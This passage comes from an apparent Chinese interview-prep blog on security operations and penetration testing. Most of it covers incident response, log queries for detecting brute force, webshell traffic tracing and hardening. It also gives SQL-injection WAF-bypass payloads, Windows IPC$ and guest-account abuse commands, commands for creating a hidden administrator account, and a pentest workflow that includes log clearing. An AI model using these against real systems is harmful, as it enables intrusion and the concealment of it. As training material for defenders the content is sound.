产品都有自己独特的检测规则体系，解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。</p></li><li><p>处理模块</p><p>针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端 Web 服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。不同的 WAF  产品会自定义不同的拦截警告页面，在日常渗透中我们也可以根据不同的拦截页面来辨别出网站使用了哪款 WAF 产品，从而有目的性的进行 WAF 绕过。</p></li><li><p>日志记录</p><p>WAF 在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。</p></li></ul><p><strong>绕 WAF 的多种方式</strong></p><ul><li><p>字母大小写混合绕过</p><p>原因：服务器端检测时未开启大小写不敏感</p><p>形式：<code>UnIon SeLecT</code></p></li><li><p>多重关键字</p><p>原因：服务器端检测到敏感字符时替换为空 </p><p>形式：<code>ununionion selselectect</code></p></li><li><p>注释</p><p>原因：服务器端未检测或检测不严注释内的字符串 </p><p>形式：<code>/**/，/*!*/，/*!12345*/，#，-- -</code> 等</p></li><li><p>编码绕过</p><p>原因：服务器端未检测或检测不严具有编码形式的关键字 </p><p>类型：十六进制编码、URL 编码、Unicode 编码 </p><p>形式：<code>0x61646d696e、%20、%u0020</code></p></li><li><p>等价函数或命令</p><p>原因：服务器端黑名单不完整，过滤不严 </p><p>形式： </p><p>Mysql 查询：<code>Union distinct、updatexml、Extractvalue、floor</code> </p><p>字符串截取函数：<code>mid、substr、substring、left、reverse </code></p><p>字符串连接函数：<code>concat、group_concat、concat_ws </code></p><p>字符串转换：<code>char、hex、unhex</code> </p><p>替换逗号：<code>limit 1 offset 0，mid(version() from 1 for 1) </code></p><p>替换等号：<code>like</code></p></li><li><p>组合绕过</p><p>原因：服务器端检测多处位置，需要多重绕过方式组合使用 </p><p>形式：<code>id = 1’ and/**/’1’like’2’/**//*!12345union*/select 1,2,3</code></p></li><li><p>特殊字符</p><p>原因：数据库中效果相同，服务器端却没有限制 </p><p>形式：</p><p>科学记数法 <code>and 1e0 = 1e0 </code></p><p>空白字符 <code>%0a %a0 %0b %20 %09 </code></p><p>反单引号 <code>table_name</code> </p><p>括号 <code>select * from (test.admin)</code></p></li></ul><h2 id="四、linux应急响应常用命令（T1）："><a href="#四、linux应急响应常用命令（T1）：" class="headerlink" title="四、linux应急响应常用命令（T1）："></a>四、linux应急响应常用命令（T1）：</h2><h3 id="1-系统排查"><a href="#1-系统排查" class="headerlink" title="1.系统排查"></a>1.系统排查</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180655883.png" alt="image-20230731180655883"></p><h3 id="2-进程排查"><a href="#2-进程排查" class="headerlink" title="2.进程排查"></a>2.进程排查</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731181123128.png" alt="image-20230731181123128"></p><h3 id="3-服务排查"><a href="#3-服务排查" class="headerlink" title="3.服务排查"></a>3.服务排查</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731181528422.png" alt="image-20230731181528422"></p><h3 id="4-日志分析"><a href="#4-日志分析" class="headerlink" title="4.日志分析"></a>4.日志分析</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731181640388.png" alt="image-20230731181640388"></p><h3 id="5-查看登陆成功日期、用户名、IP地址的命令"><a href="#5-查看登陆成功日期、用户名、IP地址的命令" class="headerlink" title="5.查看登陆成功日期、用户名、IP地址的命令"></a>5.查看登陆成功日期、用户名、IP地址的命令</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731181844954.png" alt="image-20230731181844954"></p><h2 id="四、windows应急响应常用命令（T1）："><a href="#四、windows应急响应常用命令（T1）：" class="headerlink" title="四、windows应急响应常用命令（T1）："></a>四、windows应急响应常用命令（T1）：</h2><h3 id="1-系统账户相关"><a href="#1-系统账户相关" class="headerlink" title="1.系统账户相关"></a>1.系统账户相关</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731182023367.png" alt="image-20230731182023367"></p><h3 id="2-进程端口相关"><a href="#2-进程端口相关" class="headerlink" title="2.进程端口相关"></a>2.进程端口相关</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731182243135.png" alt="image-20230731182243135"></p><h3 id="3-启动项，计划任务，服务"><a href="#3-启动项，计划任务，服务" class="headerlink" title="3.启动项，计划任务，服务"></a>3.启动项，计划任务，服务</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731182316866.png" alt="image-20230731182316866"></p><h3 id="4-日志目录"><a href="#4-日志目录" class="headerlink" title="4.日志目录"></a>4.日志目录</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731182405270.png" alt="image-20230731182405270"></p><h2 id="三、Winodws-命令执行漏洞"><a href="#三、Winodws-命令执行漏洞" class="headerlink" title="三、Winodws 命令执行漏洞"></a>三、Winodws 命令执行漏洞</h2><p>Windows 命令执行漏洞，就是在 Winodws 环境下存在的命令执行漏洞，通过相关的漏洞验证方法确认了存在命令执行漏洞后，我们可以使用 Windows 环境下的一些命令去对漏洞进行利用。</p><ul><li>通过涉及到主机探测、扫描、路由、协议、远程、进程、端口、服务等常见的 Windows 的命令</li><li>如果我们的服务器是一台 Windows 操作系统，存在着命令执行漏洞</li><li>我们就可以通过上面的这些漏洞进行命令执行的操作 </li><li>对 Windows 服务器系统进行扫描探测、进行进程和服务管理、进行内网渗透、服务器提限等</li></ul><h3 id="Windows-命令执行漏洞利用"><a href="#Windows-命令执行漏洞利用" class="headerlink" title="Windows 命令执行漏洞利用**"></a>Windows 命令执行漏洞利用**</h3><p>通过以上的学习我们知道了 Windows 下的命令执行漏洞的原理以及一些利用方法，下面将列出常用到的 Windows 命令，可以利用到 Windows 命令执行的漏洞当中去。</p><ul><li>ipconfig /all 查看网络连接</li><li>net use \ip\ipc$ “” /user:” “    建立 IPC 空链接</li><li>net use \ip\ipc$ “密码” /user:”用户名” 建立 IPC 非空链接</li><li>net use h: \ip\c$ “密码” /user:”用户名” 直接登陆后映射对方 C：到本地为 H:</li><li>net use h: \ip\c$ 登陆后映射对方 C：到本地为 H:</li><li>net use \ip\ipc$ /del 删除 IPC 链接</li><li>net use h: /del 删除映射对方到本地的为 H: 的映射</li><li>net user guest /active:yes 激活 guest 用户</li><li>net user guest 12345 用 guest 用户登陆后用将密码改为 12345</li><li>echo 信息 &gt;&gt; pass.txt 将 “信息” 保存到 pass.txt 文件中</li></ul><h2 id="三、Linux-命令执行漏洞"><a href="#三、Linux-命令执行漏洞" class="headerlink" title="三、Linux 命令执行漏洞"></a>三、Linux 命令执行漏洞</h2><ul><li>Linux 命令执行漏洞，就是在 Linux 服务器上存在的命令执行下漏洞</li><li>Linux 命令执行漏洞相对于 Windows 命令执行漏洞来说，利用起来更加的容易</li><li>因为 Linux 的一些操作本省就是需要通过一些命令去进行管理和执行</li></ul><p>命令在 Linux 中的执行分为 4 步：判断路径、检查别名、判断内外部、路径查找文件</p><h3 id="Linux-命令执行漏洞利用"><a href="#Linux-命令执行漏洞利用" class="headerlink" title="Linux 命令执行漏洞利用"></a>Linux 命令执行漏洞利用</h3><ul><li>Linux 系统下基本命令，我们注意这些命令要区分大小写</li><li>通过这些命令我们可以对 Linux 下的命令执行漏洞进行利用</li><li>包括系统、资源、进程、网络、用户、服务等常见的 Linux 系统命令</li></ul><h2 id="二、判断靶标站点是-windows-x2F-linux？"><a href="#二、判断靶标站点是-windows-x2F-linux？" class="headerlink" title="二、判断靶标站点是 windows/linux？"></a>二、判断靶标站点是 windows/linux？</h2><p>1、大小写检测：windows 大小写不敏感，而 linux 大小写敏感。</p><p>2、PING 指令：根据 TTL 值，winodws 一般情况下 &gt; 100,linux&lt;100 TTL (生存时间值)：该字段指定 IP 包被路由器丢弃之前允许通过的最大网段数量。</p><h2 id="三、说一下你的漏洞挖掘经历："><a href="#三、说一下你的漏洞挖掘经历：" class="headerlink" title="三、说一下你的漏洞挖掘经历："></a>三、说一下你的漏洞挖掘经历：</h2><p>挖的edu，找到个水平越权，直接改id=什么就好</p><h2 id="四、日志的关注点"><a href="#四、日志的关注点" class="headerlink" title="四、日志的关注点"></a>四、日志的关注点</h2><p><strong>1、异常时间段登录</strong></p><p>比如半夜一两点三四点，有事件 ID4624 产生，服务器有异常登录，开启下列排查，并修改远程桌面密码，尝试溯源。</p><p><strong>2、系统安全日志</strong>，针对服务器。</p><p><strong>3、windows 安全日志（</strong>系统安全日志的一种），</p><p><strong>4、关于远程桌面登录的记录</strong>，</p><p>成功和失败事件类型和 ID</p><p>远程登录成功，和管理员确定是非管理员操作，基本判定是失陷</p><p>远程登录不成功，需要检查谁在登录，如何去禁止登录</p><p>（1）内网，检查谁在登录，并且定位 IP 进行排查（内网已经失陷）</p><p>（2）外网，封禁 IP 或关闭远程服务。</p><h2 id="四、常见取证分析工具"><a href="#四、常见取证分析工具" class="headerlink" title="四、常见取证分析工具"></a>四、常见取证分析工具</h2><p>wireshark</p><p>xplico</p><p>volatility</p><p>fastlr collector</p><p>autopsy</p><p>dumolt</p><p>ftk lmager</p><p>foremost</p><p>scalpel</p><p>bulik_exetractor</p><h2 id="四、流量分析溯源思路"><a href="#四、流量分析溯源思路" class="headerlink" title="四、流量分析溯源思路"></a>四、流量分析溯源思路</h2><p>假设发现 web 应用服务器发现文件异常增多，初步怀疑被上传 webshell，描述流量分析溯源的思路</p><p>可利用流量工具进行溯源：</p><p>1、查看 eval、z0、shell、whoami 等关键字，查看出现次数过多的时候，可能 需要查看是哪个页面发起的请求，有可能是 webshell </p><p>2、通过 WireShark 工具快速搜索关键字，定位到异常流量包 </p><p>3、找出异常 IP 和所上传的内容，查看是否为 webshell </p><h2 id="四、定位到攻击-IP"><a href="#四、定位到攻击-IP" class="headerlink" title="四、定位到攻击 IP"></a>四、定位到攻击 IP</h2><p>1、 首先通过选择 - 统计 - 对话查看流量的走向情况，定位可疑的 IP 地址 </p><p>2、 根据定位到的 IP 地址，尝试对上传的 webshell 进行定位 ip.addr ==ip &amp;&amp;http matches “uploadleval|select|xp_cmdshell”&amp;&amp; http.request.method ==  “POST” </p><p>3、 查找到 Webshell 后尝试溯源漏洞位置，http.request.uri contains“webshell.php”，定位到最开始 webshell 执行或上传的时候 </p><p>4、 根据最开始的 HTTP 上传包或者其他漏洞特产定位漏洞类型</p><h2 id="四、ip溯源办法："><a href="#四、ip溯源办法：" class="headerlink" title="四、ip溯源办法："></a>四、ip溯源办法：</h2><p>如果是代理就没意义，如果不是代理反查域名绑定，拿信息，丢裤子里，如果是个<br>web，就打回去拿信息</p><h2 id="四、有没有用过设备："><a href="#四、有没有用过设备：" class="headerlink" title="四、有没有用过设备："></a>四、有没有用过设备：</h2><p>奇安信的天眼、WAF 、蜜罐、绿盟态势感知、防火墙、IDS（入侵检测系统）、IPS（入侵防御系统），中睿的睿眼，他会自动匹配可能是攻击的数据包，然后通过数据包判断是否是攻击。</p><p>天眼的全称是奇安信新一代安全感知系统，它以攻防渗透和数据分析为核心竞争力，聚焦威胁检测和响应，为安全服务和分析人员提供一套在监测预警、威胁检测、溯源分析和响应处置上得心应手的威胁检测平台。</p><ul><li><p>天眼三大功能：</p><p>传感器（对流量解析还原，发现网络攻击和 web 攻击能力） </p><p>沙箱（发现恶意样本投递能力）</p><p>分析平台（存储历史流量，分析威胁和溯源能力）  </p></li><li><p>天眼使用：</p><p>天眼威胁感知： 警告类型：APT 攻击   威胁级别：高危   攻击结果：失陷    攻击次数：3 </p><p>天眼搜索：源 IP sip   目的 IP dip  地理信息：境内还是境外   </p><p>搜索示例:（sip:”192.168.1.1”）OR（dip:”192.168.1.1”）  </p><p>天眼类别：威胁感知调查分析 场景化分析</p><p>日志检索：例子：search sip:”10.1.1.1/8” |tcp 100 dip 资产 报表 安全服务  系统管理</p></li><li><p>天眼分析：</p><p>爆破和踩点行为分析：</p><p>登录爆破类：单个IP，使用多个用户名和密码组合进行登录尝试，导致短时间内大量登录失败<br>目录和资源爆破：短时间内访问大量url，触发大量404<br>手段：</p><p>1.找到爆破行为IP，阻断爆破行为    </p><p>2.找到攻击成功的IP   </p><p>3.分析攻击IP的操作，编写事件报告</p><p>ftp 爆破：</p><pre class="line-numbers language-none"><code class="language-none">日志检索使用天眼语法搜索爆破IP：normal_ret:failed AND proto:ftp判断爆破成功行为：normal_ret:success  AND proto:ftp AND sip:(攻击ip1 OR 攻击ip2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ssh 爆破：</p><pre class="line-numbers language-none"><code class="language-none">日志检索使用天眼语法搜索爆破IP：normal_ret:failed AND proto:ssh判断爆破成功行为：normal_ret:success AND proto:ssh AND sip(攻击ip1 OR 攻击ip2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>数据库爆破：</p><pre class="line-numbers language-none"><code class="language-none">normal_ret:failed AND proto:(oracle OR mysql OR mssql OR postgresql)normal_ret:success AND proto:(oracle OR mysql OR mssql OR postgresql) AND sip:(攻击IP1 OR 攻击IP2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>远程桌面爆破：</p><pre class="line-numbers language-none"><code class="language-none">normal_ret:failed AND proto:rdpnormal_ret:success AND proto:rdp AND sip:(攻击IP1 OR 攻击IP2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>web 登录入口爆破：</p><pre class="line-numbers language-none"><code class="language-none">对弱口令就行分析：uri:爆破路径 AND sip:攻击ip，查找爆破的流量日志<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目录和资源猜解：</p><pre class="line-numbers language-none"><code class="language-none">根据域名和攻击ip进行分析：host:域名 AND sip:攻击IP，查询攻击IP的访问记录是否触发大量404响应<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>天眼失陷事件处理：</p><p>1、web攻击分析思路：<br>web攻击：查看请求包 与 响应包（有没有报红，有没有攻击成功）<br>查看告警详情（查看请求头、请求体内容，定位到告警攻击动作的payload）<br>分析攻击动作是什么（读取文件、打印输出内容、写入文件和尝试下载文件，执行函数或命令 XSS  XXE webshell等）<br>分析响应（分析告警响应头，响应体，网络行为是否有动作预期的结果）  </p><p> 发现 webshell 和主机木马： 确认创建时间、功能分析等，查看访问日志，攻击行为记录等，通知主机所属人 对发现的 webshell 文件或木马进行排查处置</p></li></ul><h2 id="四、一个登录框可以怎么测试："><a href="#四、一个登录框可以怎么测试：" class="headerlink" title="四、一个登录框可以怎么测试："></a>四、一个登录框可以怎么测试：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731182915977.png" alt="image-20230731182915977"></p><h2 id="二、拿到一个待检测的站"><a href="#二、拿到一个待检测的站" class="headerlink" title="二、拿到一个待检测的站"></a>二、拿到一个待检测的站</h2><p><strong>一、信息收集</strong></p><p>1.获取域名的 whois 信息,获取注册者邮箱姓名电话等。</p><p>2.通过站长之家、明小子、k8、站长之家等查询服务器旁站以及子域名站点，因为主站一般</p><p>比较难，所以先看看旁站有没有通用性的 cms 或者其他漏洞。</p><p>3、通过 DNS 域传送漏洞、备份号查询、SSl 证书、APP、微信公众号、暴力破解、DNS</p><p>历史记录、K8 C 段查询、Jsfinder、360 或华为威胁情报、证书序列号获取企业二级域名与 ip。</p><p>4、通过 Nmap、Wappalyzer、御剑等查看服务器操作系统版本，web 中间件，看看是否存</p><p>在已知的漏洞，比如 IIS，APACHE,NGINX 的解析漏洞</p><p>5.通过 7KB、破壳扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如</p><p>php 探针（phpinfo.php）、管理员备份文件。</p><p>6.google hack 进一步探测网站的信息，后台，敏感文件</p><p>7、敏感信息收集，如 github 源码、用 7kb、破壳扫源代码泄露（.hg、.git、cvs、svn、.DS_store</p><p>源代码泄露）、google hack、接口信息泄露、社工信息泄露、邮箱地址信息收集、网盘搜索、钟</p><p>馗之眼、天眼查、威胁情报、微步在线等</p><p>8、通过 Wappalyzer、御剑工具对网站指纹识别（包括，cms，cdn，证书等），dns 记录</p><p><strong>二、漏洞扫描</strong></p><p>1)用 AWVS、APPSCAN、长亭科技的 Xray 等扫描器检测 Web 漏洞，如 XSS,XSRF,sql</p><p>注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命</p><p>令执行，弱口令，上传，编辑器漏洞，暴力破解等</p><p>2)用 namp、天镜、Nessus、极光等扫描系统 ip，对扫描出来的高危漏洞进行测试，如</p><p>ms08-067、ms17-010、ms12-020、ms15-035、ms19-0708、永恒之蓝 2 代、cve-2017-7494</p><p>（samba）、cve-2014-6271(破壳)、php cgi 等相关漏洞验证。</p><p><strong>3****）漏洞利用</strong></p><p>利用以上的方式拿到 webshell，或者其他权限</p><p><strong>4****）权限提升</strong></p><p>提权服务器，比如 windows 下 mysql 的 udf 提权，serv-u 提权，windows 低版本的漏洞，</p><p>如 iis6,pr,巴西烤肉，linux 脏牛漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以</p><p>及 oracle 低权限提权</p><p><strong>5)</strong> <strong>日志清理</strong></p><p>操作系统、中间件、数据库等日志进行清除</p><p><strong>6****）总结报告及修复方案</strong></p><h2 id="四、数据库提权思路："><a href="#四、数据库提权思路：" class="headerlink" title="四、数据库提权思路："></a>四、数据库提权思路：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731183520438.png" alt="image-20230731183520438"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731183550241.png" alt="image-20230731183550241"></p><h2 id="四、如果有1w条告警怎么办："><a href="#四、如果有1w条告警怎么办：" class="headerlink" title="四、如果有1w条告警怎么办："></a>四、如果有1w条告警怎么办：</h2><p>样本降噪，看200，找有没有外联的东西，打进来肯定是要干点什么的，看命令执行，看ip。</p><h2 id="四、普通的加固手段"><a href="#四、普通的加固手段" class="headerlink" title="四、普通的加固手段"></a>四、普通的加固手段</h2><p>普通的加固手段包括以下几种：</p><ol><li>更新补丁：定期更新操作系统、应用程序的补丁，修复已知的漏洞和安全问题。</li><li>强化口令策略：采用复杂、难以猜测的密码，并进行定期更换。同时可以启用账户锁定、多次失败尝试限制等功能，提高口令安全性。</li><li>加强身份验证：采用多因素身份验证技术，例如使用硬件令牌、生物特征等方式，确保只有授权用户才能访问系统。</li><li>安装防病毒软件：安装并及时更新防病毒软件，定期进行全盘扫描和实时监控，以便及时发现和处置潜在的恶意软件。</li><li>关闭不必要服务：关闭系统中不必要的服务和端口，降低攻击面，避免被利用。</li><li>限制访问权限：根据业务需要，设置合理的访问权限，对于未授权的用户或者设备进行限制，提高系统的安全性。</li><li>数据备份与恢复：定期备份重要数据，并将其存储在安全可靠的位置。在出现故障或事件时，能够快速恢复数据，避免数据丢失和系统停机。</li></ol><p>总之，以上这些普通的加固手段可以帮助提高系统的安全性和稳定性，并且也是网络安全基础建设的关键步骤。在实际操作中，需要根据具体情况和需求，结合其他安全措施来进行综合加固。同时需要注意及时更新和检查，以确保系统始终处于安全状态。</p><h2 id="四、一些常用工具汇总"><a href="#四、一些常用工具汇总" class="headerlink" title="四、一些常用工具汇总"></a>四、一些常用工具汇总</h2><ul><li>威胁情报平台</li></ul><pre class="line-numbers language-BASH" data-language="BASH"><code class="language-BASH">https://x.threatbook.cn/ 微步在线威胁情报社区https://ti.qianxin.com/ 奇安信威胁情报中心https://ti.360.cn/ 360威胁情报中心https://www.venuseye.com.cn/  VenusEye威胁情报中心<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>域名反查</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">站长之家IP查询网址：https://ip.tool.chinaz.com/ipbatchIP138查询网：https://www.ip138.com/高精度IP定位：https://www.opengps.cn/Data/IP/LocHighAcc.aspxIP信息查询：https://www.ipip.net/ip.html/IP地址查询在线工具：https://tool.lu/ip/多地Ping检测：http://ping.chinaz.com/Whois查询：https://whois.chinaz.com/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ip 定位网站</li></ul><pre class="line-numbers language-none"><code class="language-none">https://www.opengps.cn/Data/IP/ipplus.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>在线子域名查询</li></ul><pre class="line-numbers language-none"><code class="language-none">https://phpinfo.me/domain/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>网站指纹识别</li></ul><pre class="line-numbers language-none"><code class="language-none">在线cms识别小插件：http://whatweb.bugscaner.com/look/wahtweb（需要安装）：https://github.com/urbanadventurer/WhatWeb云悉指纹：yunsee.cn-2.0参考链接：https://blog.csdn.net/qq_41755666/article/details/123614559https://blog.csdn.net/zsw15841822890/article/details/115774385<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、关注那些重点事件日志？"><a href="#三、关注那些重点事件日志？" class="headerlink" title="三、关注那些重点事件日志？"></a>三、关注那些重点事件日志？</h2><p>高级别的演练持续时间为两到三周，进入中后期，人倦马乏，很容易进入懈怠疏漏。其实，攻击方的比拼在演练中段已经进入焦灼状态，大比分在此时拉开。防守方也需要加强投入，在中后期更需要关注一些重点事件，及时发现包括 0day、新增外联、内网异常行为之类的风险。攻击方此时会亮出各家压箱底的武器，0day  的使用和针对防护设备的变形绕过都是常态，不排除现有的防护设备和系统暂时  “失明”，难以全面覆盖到攻击链的每一个点，这时，在日志中发现蛛丝马迹，找到关键重点事件就极有意义。这些重点事件类型包括：</p><p><strong>1、异常属性类</strong></p><p>考虑到攻方可能将扫描器和 C2 服务器部署在个人 VPS 上，而这些 VPS 极有可能是个人购买的云服务。在攻击日志分析时，对于 IP  归属地是国内外的云服务商的情况都需要加以关注。有的攻击方会在深夜乘防守方警惕性降低时进行攻击尝试，因此半夜出现的新增攻击日志源，也值得警惕。</p><p>攻击源 IP 的时间属性也有一定价值，如果某个源 IP 只在攻防演练开始之才出现日志，而之前并未出现过攻击行为，很可能来自于演练攻击方。单纯从攻击日志的各类属性特点来分析日志，也能起到一定作用，当然以上方法结合分析，效果更好。</p><p>NOD（Newly Observed Domain），域名也是可疑的观察对象之一。在演练前突然新增的域名，极有可能是攻击方为活动前做的准备。对于这类 NOD  域名可以提前分析获取，加入关注名单。一旦产生类似的外联日志，哪怕原有的情报和态势系统没有告警，也建议马上行动，展开失陷资产排查，并向前溯源，最大程度的还原攻击路径。</p><p><strong>2、木马连接类</strong></p><p>Webshell  连接工具，包括老式的大马，小马，菜刀，及各类新式的冰蝎，哥斯拉，天蝎，内存马等，特点是倾向于加密的通信，让传统检测设备无法发现行踪。在防守方的日常检测中，一旦发现木马远控连接工具，包括 Cobalt Strike 的命令下发流量（HTTP 协议）和证书指纹规则（HTTPS 协议），MSF 自带木马 Meterpreter  及各类开源远控等的痕迹，以及这些工具通信流量产生的日志都需要警醒，这预示着内网已有机器失陷。部分工具的加密流量通信单纯靠某条规则无法检测，可能需要多模块综合研判以及 AI 分析模块协助处理。所以除了攻击日志，还需要将 AV、情报、AI 研判模块产生的日志一并纳入检测分析范围。</p><p><strong>3、代理隧道类</strong></p><p>在获取权限后，攻击方通常会使用代理工具搭建隧道进入内网，以获得稳定的控制权限。一旦出现代理隧道的日志，也说明形势较为危急，预示着攻击方可能已经打入内网。这些代理类日志包括 SOCKS 的反向代理（Earthworm、FRP、dtunnel_lite 等）、Reduh、Regeorg 等各类 web  代理隧道。传统设备如 IPS  的先验规则只能检测到明文代理流量，新华三安全设备特意基于代理隧道进行了专项覆盖，对于以上代理可以最大程度的识别，加密的隧道，可以在协商阶段尽早识别。</p><p><strong>4、横向扫描类</strong></p><p>利用代理隧道进入内网的攻击方，可能通过 Ladon 等工具进行网段、端口、服务的探测，以及使用爆破，撞库的方式进行内网密码破解。因此由内网 IP 发起的扫描探测日志如果被部署在内网的安全设备检测上报，那么这些日志也是非常值得关注的。</p><p>这几类重点事件的日志，一般表明有系统被攻陷，因此这些规则需要在演练之前保持开启状态，且演练期间关注级别很高，即使出现的日志条数只有一条，也要优先介入分析。这也对防守方攻防基础提出了一定的要求，初级防守方人员可以联动后台攻防实验室进行有效协同，中高级守方人员可以在实战中进行攻击负载和技战法的总结，形成经验智库。</p><p><strong>5、补充</strong></p><p>现场分析人员若对某条攻击日志的具体含义持疑，无法判定攻击源 IP 是否恶意时，可以结合该源 IP 和该事件的其他相关日志进行辅助分析，通过绘制力导向图，来判断该 IP 的攻击意图。</p><ul><li>OA:（重点）泛微，致远，金蝶，蓝凌，万户，金和或者自研发系统 OA，财务系统</li><li>ERP:（重点）Microsoft Dynamics GP，Oracle JD Edwards EnterpriseOne，金蝶 - U9，用友 - K/3, 神舟数码 - 易助，SAP ERP，Infor M3</li><li>重要信息节点：email，exchange，office 365，DC2012R2，DC2008 R2</li><li>web 中间件：IIS/apache/tomcat/weblogic/jboss/websphere/Nginx/FastCGI/PHPCGI/haproxy</li></ul><h2 id="二、有什么办法判断误报？"><a href="#二、有什么办法判断误报？" class="headerlink" title="二、有什么办法判断误报？"></a>二、有什么办法判断误报？</h2><p>时间线拉长，看看类似的请求或者数据包在之前很长一段时间有无出现。如果不是特别有规律的参数，如 md5 这类，一般是业务误报。如果是一些类似于文件操作或者命令执行的参数，很有可能就是攻击数据包。实在不确定就去问客户。</p><p>处置单大致分为 4 类，</p><p>1、业务系统之间的调用请求，设备报警，内网渗透向；</p><p>2、业务公司人员上生产系统上的 poc 测试（直接执行注入和远程读取命令），被系统误报成渗透攻击（这一条应该不算是误报，毕竟有攻击行为，只不过是自己人干的）；</p><p>3、centos 系统自动更新系统文件，设备报警，未经授权的访问外网；</p><p>4、业务人员配置中间件，设备报警；</p><h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802200822073.png" alt="image-20230802200822073"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802200846847.png" alt="image-20230802200846847"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802200905258.png" alt="image-20230802200905258"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802200919990.png" alt="image-20230802200919990"></p><h2 id="二、敏感信息收集"><a href="#二、敏感信息收集" class="headerlink" title="二、敏感信息收集"></a>二、敏感信息收集</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802201138494.png" alt="image-20230802201138494"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802201156536.png" alt="image-20230802201156536"></p><h2 id="二、内网渗透"><a href="#二、内网渗透" class="headerlink" title="二、内网渗透"></a>二、内网渗透</h2><h3 id="二、内网渗透基本流程"><a href="#二、内网渗透基本流程" class="headerlink" title="二、内网渗透基本流程"></a>二、内网渗透基本流程</h3><p>漏洞挖掘 - 漏洞利用 - 提权准备 - 提权</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/0YfDibTv8hugdfVKKbYMk2DCNIR8DuuicYECVcl8S9gWVI8p6Yd22L8piaFmgxTFy7ewI1IHDoNI4yQ9qqxVY99JQ/640?wx_fmt=png&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>前提是利用已经控制的一台计算机作为入侵内网的跳板，在其他内网计算机看来访问全部来自于跳板机 (WEB Server)</p><h3 id="四、如何建立隐藏用户？"><a href="#四、如何建立隐藏用户？" class="headerlink" title="四、如何建立隐藏用户？"></a>四、如何建立隐藏用户？</h3><pre class="line-numbers language-none"><code class="language-none">1、net user test$ 123456 /add [建立隐藏用户]2、net localgroup administrators test$ /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="四、正向代理和反向代理的区别？"><a href="#四、正向代理和反向代理的区别？" class="headerlink" title="四、正向代理和反向代理的区别？"></a>四、正向代理和反向代理的区别？</h3><p>正向代理即是客户端代理，代理客户端，服务端不知道实际发起请求的客户端 反向代理即是服务端代理，代理服务端，客户端不知道实际提供服务的服务端</p><p>正向 Shell：攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。 反向 Shell：被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。 正向代理即是客户端代理，代理客户端，服务端不知道实际发起请求的客户端. 反向代理即是服务端代理，代理服务端，客户端不知道实际提供服务的服务端</p><h3 id="四、横向渗透命令执行手段？"><a href="#四、横向渗透命令执行手段？" class="headerlink" title="四、横向渗透命令执行手段？"></a>四、横向渗透命令执行手段？</h3><p>psexec，wmic，smbexec，winrm，net use 共享 + 计划任务 + type 命令</p><p><strong>psexec 和 wmic 或者其他的区别？</strong></p><p>psexec 会记录大量日志，wmic 不会记录下日志。wmic 更为隐蔽</p><h3 id="四、域内攻击方法有了解过吗？"><a href="#四、域内攻击方法有了解过吗？" class="headerlink" title="四、域内攻击方法有了解过吗？"></a>四、域内攻击方法有了解过吗？</h3><p>MS14-068、Roasting 攻击离线爆破密码、委派攻击，非约束性委派、基于资源的约束委派、ntlm relay</p><h3 id="四、桌面有管理员会话，想要做会话劫持怎么做？"><a href="#四、桌面有管理员会话，想要做会话劫持怎么做？" class="headerlink" title="四、桌面有管理员会话，想要做会话劫持怎么做？"></a>四、桌面有管理员会话，想要做会话劫持怎么做？</h3><p>提权到 system 